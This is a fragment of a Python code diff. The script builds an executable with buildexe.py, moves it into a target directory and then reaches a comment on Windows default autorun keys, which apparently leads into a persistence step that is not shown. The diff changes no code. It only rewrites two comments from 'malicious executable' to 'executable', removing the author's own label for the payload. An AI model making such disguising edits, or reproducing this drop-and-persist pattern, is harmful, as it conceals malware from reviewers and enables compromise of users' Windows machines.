@@ -9,10 +9,10 @@ filepath = os.path.join(filedir,filename)
 if os.path.isfile(filepath):
 	os.remove(filepath)
 
-# Use buildexe.py to create a malicious executable
+# Use buildexe.py to create an executable
 os.system("python buildexe.py")
 
-# Move the malicious executable to the desired directory
+# Move the executable to the desired directory
 shutil.move(filename,filedir)
 
 # Windows default autorun keys:
